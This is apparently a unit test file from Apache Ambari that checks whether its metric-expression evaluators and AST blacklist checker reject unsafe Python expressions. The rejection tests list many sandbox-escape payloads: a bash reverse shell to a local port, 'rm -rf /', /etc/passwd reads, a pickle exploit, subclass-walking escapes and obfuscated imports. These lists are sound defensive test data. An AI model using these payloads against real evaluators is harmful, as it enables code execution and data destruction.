#!/usr/bin/env python3

"""
Licensed to the Apache Software Foundation (ASF) under one
or more contributor license agreements.  See the NOTICE file
distributed with this work for additional information
regarding copyright ownership.  The ASF licenses this file
to you under the Apache License, Version 2.0 (the
"License"); you may not use this file except in compliance
with the License.  You may obtain a copy of the License at

    http://www.apache.org/licenses/LICENSE-2.0

Unless required by applicable law or agreed to in writing, software
distributed under the License is distributed on an "AS IS" BASIS,
WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
See the License for the specific language governing permissions and
limitations under the License.
"""

import unittest
from ambari_commons.ast_checker import ASTChecker, BlacklistRule
from ambari_agent.alerts.metric_alert import JmxMetric
from ambari_agent.alerts.ams_alert import AmsMetric


class TestJmxMetric(unittest.TestCase):
  def test_jmx_metric_calculation(self):
    jmx_info = {"property_list": ["a/b", "c/d"], "value": "({0} + {1}) / 100.0"}
    metric = JmxMetric(jmx_info)
    result = metric.calculate([50, 50])
    self.assertEqual(result, 1.0)

  def test_jmx_metric_with_complex_calculation(self):
    jmx_info = {
      "property_list": ["x/y", "z/w"],
      "value": "max({0}, {2}) / min({1}, {3}) * 100.0",
    }
    metric = JmxMetric(jmx_info)
    result = metric.calculate([100, 50, 200, 25])
    self.assertEqual(result, 800.0)

  def test_jmx_metric_with_string_manipulation(self):
    jmx_info = {
      "property_list": ["str1/value", "str2/value"],
      "value": "len({0}) + len({1})",
    }
    metric = JmxMetric(jmx_info)
    result = metric.calculate(["hello", "world"])
    self.assertEqual(result, 10)

  def test_jmx_metric_with_unsafe_operation(self):
    jmx_info = {
      "property_list": ["a/b"],
      "value": "__import__('os').system('echo hacked')",
    }

    with self.assertRaises(Exception):
      JmxMetric(jmx_info)


class TestAmsMetric(unittest.TestCase):
  # Safe test cases
  def test_safe_simple_calculation(self):
    metric_info = {
      "metric_list": ["a", "b"],
      "interval": 5,
      "app_id": "test_app",
      "minimum_value": 0,
      "value": "args[0][k] + args[1][k]",
    }
    metric = AmsMetric(metric_info)
    result = metric.calculate_value([{"k": 10}, {"k": 20}])
    self.assertEqual(result, [30])

  def test_safe_complex_calculation(self):
    metric_info = {
      "metric_list": ["x", "y", "z"],
      "interval": 5,
      "app_id": "test_app",
      "minimum_value": 0,
      "value": "max(args[0][k], args[1][k]) / min(args[1][k], args[2][k]) * 100.0",
    }
    metric = AmsMetric(metric_info)
    result = metric.calculate_value([{"k": 100}, {"k": 50}, {"k": 25}])
    self.assertEqual(result, [400.0])

  def test_safe_string_manipulation(self):
    metric_info = {
      "metric_list": ["str1", "str2"],
      "interval": 5,
      "app_id": "test_app",
      "minimum_value": 0,
      "value": "len(str(args[0][k])) + len(str(args[1][k]))",
    }
    metric = AmsMetric(metric_info)
    result = metric.calculate_value([{"k": "hello"}, {"k": "world"}])
    self.assertEqual(result, [10])

  def test_safe_list_comprehension(self):
    metric_info = {
      "metric_list": ["numbers"],
      "interval": 5,
      "app_id": "test_app",
      "minimum_value": 0,
      "value": "sum([x for x in args[0][k] if x > 5])",
    }
    metric = AmsMetric(metric_info)
    result = metric.calculate_value([{"k": [1, 6, 2, 7, 3, 8]}])
    self.assertEqual(result, [21])

  def test_safe_dict_manipulation(self):
    metric_info = {
      "metric_list": ["data"],
      "interval": 5,
      "app_id": "test_app",
      "minimum_value": 0,
      "value": "sum(args[0][k].values())",
    }
    metric = AmsMetric(metric_info)
    result = metric.calculate_value([{"k": {"a": 1, "b": 2, "c": 3}}])
    self.assertEqual(result, [6])

  def test_safe_conditional_expression(self):
    metric_info = {
      "metric_list": ["x", "y"],
      "interval": 5,
      "app_id": "test_app",
      "minimum_value": 0,
      "value": "args[0][k] if args[0][k] > args[1][k] else args[1][k]",
    }
    metric = AmsMetric(metric_info)
    result = metric.calculate_value([{"k": 10}, {"k": 20}])
    self.assertEqual(result, [20])

  def test_safe_boolean_operations(self):
    metric_info = {
      "metric_list": ["a", "b", "c"],
      "interval": 5,
      "app_id": "test_app",
      "minimum_value": 0,
      "value": "int(args[0][k] > 0 and args[1][k] < 10 or args[2][k] == 5)",
    }
    metric = AmsMetric(metric_info)
    result = metric.calculate_value([{"k": 1}, {"k": 5}, {"k": 5}])
    self.assertEqual(result, [1])

  def test_safe_compute_mean(self):
    metric_info = {
      "metric_list": ["numbers"],
      "interval": 5,
      "app_id": "test_app",
      "minimum_value": 0,
      "compute": "mean",
    }
    metric = AmsMetric(metric_info)
    result = metric.calculate_compute([1, 2, 3, 4, 5])  # Pass a flat list
    self.assertEqual(result, 3)

  def test_safe_compute_standard_deviation(self):
    metric_info = {
      "metric_list": ["numbers"],
      "interval": 5,
      "app_id": "test_app",
      "minimum_value": 0,
      "compute": "sample_standard_deviation",
    }
    metric = AmsMetric(metric_info)
    result = metric.calculate_compute([1, 2, 3, 4, 5])  # Pass a flat list
    self.assertAlmostEqual(result, 1.5811, places=4)

  def test_safe_compute_count(self):
    metric_info = {
      "metric_list": ["numbers"],
      "interval": 5,
      "app_id": "test_app",
      "minimum_value": 0,
      "compute": "count",
    }
    metric = AmsMetric(metric_info)
    result = metric.calculate_compute([1, 2, 3, 4, 5])  # Pass a flat list
    self.assertEqual(result, 5)

  # Unsafe test cases
  def test_unsafe_import(self):
    metric_info = {
      "metric_list": ["a"],
      "interval": 5,
      "app_id": "test_app",
      "minimum_value": 0,
      "value": "__import__('os').system('echo hacked')",
    }
    with self.assertRaises(Exception):
      AmsMetric(metric_info)

  def test_unsafe_eval(self):
    metric_info = {
      "metric_list": ["a"],
      "interval": 5,
      "app_id": "test_app",
      "minimum_value": 0,
      "value": "eval('2 + 2')",
    }
    with self.assertRaises(Exception):
      AmsMetric(metric_info)

  def test_unsafe_exec(self):
    metric_info = {
      "metric_list": ["a"],
      "interval": 5,
      "app_id": "test_app",
      "minimum_value": 0,
      "value": "exec('x = 5')",
    }
    with self.assertRaises(Exception):
      AmsMetric(metric_info)

  def test_unsafe_open_file(self):
    metric_info = {
      "metric_list": ["a"],
      "interval": 5,
      "app_id": "test_app",
      "minimum_value": 0,
      "value": "open('/etc/passwd', 'r').read()",
    }
    with self.assertRaises(Exception):
      AmsMetric(metric_info)

  def test_unsafe_subprocess(self):
    metric_info = {
      "metric_list": ["a"],
      "interval": 5,
      "app_id": "test_app",
      "minimum_value": 0,
      "value": "__import__('subprocess').call(['ls', '-l'])",
    }
    with self.assertRaises(Exception):
      AmsMetric(metric_info)

  def test_unsafe_globals(self):
    metric_info = {
      "metric_list": ["a"],
      "interval": 5,
      "app_id": "test_app",
      "minimum_value": 0,
      "value": "globals()['__builtins__']",
    }
    with self.assertRaises(Exception):
      AmsMetric(metric_info)

  def test_unsafe_attribute_access(self):
    metric_info = {
      "metric_list": ["a"],
      "interval": 5,
      "app_id": "test_app",
      "minimum_value": 0,
      "value": "args.__class__.__bases__[0].__subclasses__()",
    }
    with self.assertRaises(Exception):
      AmsMetric(metric_info)

  def test_unsafe_pickle(self):
    metric_info = {
      "metric_list": ["a"],
      "interval": 5,
      "app_id": "test_app",
      "minimum_value": 0,
      "value": "__import__('pickle').loads(b'cos\\nsystem\\n(S\"echo hacked\"\\ntR.')",
    }
    with self.assertRaises(Exception):
      AmsMetric(metric_info)

  def test_unsafe_custom_function(self):
    metric_info = {
      "metric_list": ["a"],
      "interval": 5,
      "app_id": "test_app",
      "minimum_value": 0,
      "value": "lambda: __import__('os').system('echo hacked')",
    }
    with self.assertRaises(Exception):
      AmsMetric(metric_info)

  def test_unsafe_builtin_override(self):
    metric_info = {
      "metric_list": ["a"],
      "interval": 5,
      "app_id": "test_app",
      "minimum_value": 0,
      "value": "__builtins__.__dict__['print'] = lambda x: exec(x)",
    }
    with self.assertRaises(Exception):
      AmsMetric(metric_info)


class TestBlacklistASTChecker(unittest.TestCase):
  def setUp(self):
    self.checker = ASTChecker([BlacklistRule()], use_blacklist=True)

  def test_safe_expressions(self):
    safe_expressions = [
      # Original safe expressions
      "mean",
      "1.5",
      "200",
      "args[0] * 100",
      "(args[1] - args[0])/args[1] * 100",
      "args[0]",
      "'ambari-qa@EXAMPLE.COM'",
      "calculate(args[0])",
      "args[0] + args[1]",
      "args[0] > args[1]",
      "args[0] and args[1]",
      "not args[0]",
      "-args[0]",
      "args[0] ** 2",
      "args[0] // 3",
      "args[0] % 2",
      "args[0][k]",
      "args[1][k]",
      "len(args[0])",
      "max(args[0][k], args[1][k])",
      "min(args[0][k], 10)",
      "args[0][k] + args[1][k]",
      "(args[1][k] - args[0][k]) / args[0][k] * 100 if args[0][k] != 0 else 0",
      "args[0][k] if args[0][k] > args[1][k] else args[1][k]",
      "(args[0][k] + args[1][k] + args[2][k]) / 3",
      "len(str(args[0][k]))",
      "int(args[0][k]) if args[0][k] is not None else 0",
      "args[0][k] * 2 if args[1][k] > 100 else args[0][k] / 2 if args[1][k] < 50 else args[0][k]",
      # Safe expressions from test_expressions
      "max(args[0], args[1])",
      "len([1, 2, 3])",
      "print('Hello, world!')",
      "x = [i for i in range(10)]",
      "def custom_function(x): return x * 2",
      "class CustomClass: pass",
      "try: 1/0\nexcept ZeroDivisionError: pass",
      "safe_function([1, 2, 3])",
      # Safe expressions from ams
      "args[0][k]",
      "args[1][k]",
      "len(args[0])",
      "max(args[0][k], args[1][k])",
      "min(args[0][k], 10)",
      "args[0][k] + args[1][k]",
      "(args[1][k] - args[0][k]) / args[0][k] * 100 if args[0][k] != 0 else 0",
      "args[0][k] if args[0][k] > args[1][k] else args[1][k]",
      "(args[0][k] + args[1][k] + args[2][k]) / 3",
      "len(str(args[0][k]))",
      "int(args[0][k]) if args[0][k] is not None else 0",
      "args[0][k] * 2 if args[1][k] > 100 else args[0][k] / 2 if args[1][k] < 50 else args[0][k]",
      "sample_standard_deviation_percentage(args)",
      "sample_standard_deviation(args)",
      "mean(args)",
      "count(args)",
    ]

    for expr in safe_expressions:
      with self.subTest(expression=expr):
        try:
          self.assertTrue(
            self.checker.is_safe_expression(expr), f"Expression should be safe: {expr}"
          )
        except Exception as e:
          print(f"Error: {e}, Expression should be safe: {expr}")
          raise

  def test_unsafe_expressions(self):
    unsafe_expressions = [
      # Original unsafe expressions
      "__import__('os').system('bash -i >& /dev/tcp/127.0.0.1/18888 0>&1')",
      "open('/etc/passwd').read()",
      "exec('malicious code')",
      "eval('dangerous_function()')",
      "globals()['__builtins__']['__import__']('os').system('rm -rf /')",
      "getattr(__import__('os'), 'system')('echo hacked')",
      "(lambda: __import__('subprocess').call('ls'))()",
      "__class__.__base__.__subclasses__()[40]('/etc/passwd').read()",
      "import os; os.system('whoami')",
      "().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__['sys'].modules['os'].system('ls')",
      "args[0].__class__.__bases__[0].__subclasses__()",
      "args[0].__dict__",
      "args[0].__globals__",
      # Unsafe expressions from test_expressions
      "with open('file.txt', 'r') as f: content = f.read()",
      "eval('1 + 1')",
      "os.system('echo hello')",
      "__import__('os').system('echo hello')",
      "obj._private_method()",
      "obj.__dict__",
      "_hidden_function()",
      "from module import _private_func",
      "import _private_module",
      # Additional unsafe expressions
      "import subprocess; subprocess.Popen('ls', shell=True)",
      "import pickle; pickle.loads(b'cos\\nsystem\\n(S'echo hacked'\\ntR.')",
      "__import__('os').popen('ls').read()",
      "import importlib; importlib.import_module('os').system('echo hacked')",
      "exec(\"__import__('os').system('echo hacked')\")",
      "(lambda f: f(f))(lambda f: __import__('os').system('echo hacked') or f(f))",
      "__builtins__.__dict__['__import__']('os').system('echo hacked')",
      "globals().get('__builtins__').get('__import__')('os').system('echo hacked')",
      "[c for c in ().__class__.__base__.__subclasses__() if c.__name__ == 'catch_warnings'][0]()._module.__builtins__['__import__']('os').system('echo hacked')",
      "next(c for c in {}.__class__.__bases__[0].__subclasses__() if c.__name__ == 'Popen')(['echo', 'hacked'])",
      "type(''.join, (object,), {'__getitem__': lambda self, _: __import__('os').system('echo hacked')})()['']",
      "().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__['linecache'].__dict__['os'].system('echo hacked')",
      "getattr(getattr(getattr(getattr(getattr(getattr(getattr(getattr(getattr(getattr(getattr(getattr(getattr(getattr(getattr(__import__('os'), 'path'), 'abspath'), '__globals__'), '__builtins__'), '__import__'), '__globals__'), '__builtins__'), '__import__'), '__globals__'), '__builtins__'), '__import__'), '__globals__'), '__builtins__'), '__import__')('os').system('echo hacked')",
      "(__builtins__.__dict__['__import__']('functools').reduce(lambda f, n: getattr(f, n), ['__globals__', '__builtins__', '__import__'], __import__('os')))('os').system('echo hacked')",
      "type(''.join, (object,), {'__getitem__': lambda self, _: __import__('os').system('echo hacked')})()['']",
      "(lambda fc=(lambda n: [c for c in ().__class__.__bases__[0].__subclasses__() if c.__name__ == n][0]): fc('Popen')(['echo', 'hacked']))()",
      "(lambda x: ().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__[x])('sys').modules['os'].system('echo hacked')",
      "getattr(__import__('ctypes'), 'windll', __import__('ctypes').cdll).LoadLibrary('libc.so.6').system('echo hacked')",
      "type(''.join, (object,), {'__getitem__': lambda self, _: __import__('os').system('echo hacked')})()['']",
      "next(filter(lambda x: x.__name__ == 'Popen', ().__class__.__bases__[0].__subclasses__()))(['echo', 'hacked'])",
      "(lambda fc=(lambda n: [c for c in ().__class__.__bases__[0].__subclasses__() if c.__name__ == n][0]): fc('Popen')(['echo', 'hacked']))()",
      "(lambda x: ().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__[x])('sys').modules['os'].system('echo hacked')",
      "getattr(__import__('ctypes'), 'windll', __import__('ctypes').cdll).LoadLibrary('libc.so.6').system('echo hacked')",
      "(__import__('codecs').decode('X19pbXBvcnRfXygnb3MnKS5zeXN0ZW0oJ2VjaG8gaGFja2VkJyk=', 'base64'))",
      "compile('__import__(\\'os\\').system(\\'echo hacked\\')', '<string>', 'exec')",
      "locals()['__builtins__']['__import__']('os').system('echo hacked')",
      "vars(__builtins__)['__import__']('os').system('echo hacked')",
      "(lambda x: x.__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.values())(0)[13]['eval']('__import__(\\'os\\').system(\\'echo hacked\\')')",
      "(lambda x: x.__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.values())(0)[13]['__import__']('os').system('echo hacked')",
      "import os",
      "open('file.txt', 'w')",
      "eval('1 + 1')",
      "exec('print(\"Hello\")')",
      "__import__('os').system('ls')",
      "globals()['__builtins__']['eval']('1+1')",
      "args[0].__class__.__bases__[0].__subclasses__()",
    ]

    for expr in unsafe_expressions:
      with self.subTest(expression=expr):
        try:
          self.assertFalse(
            self.checker.is_safe_expression(expr),
            f"Expression should be unsafe: {expr}",
          )
        except Exception as e:
          print(f"Error: {e},  Expression should be unsafe: {expr}")
          raise

  def test_syntax_error(self):
    expr = "(args[1] - args[0])/{args[1] * 100"
    with self.subTest(expression=expr):
      self.assertFalse(
        self.checker.is_safe_expression(expr),
        f"Expression with syntax error should be unsafe: {expr}",
      )
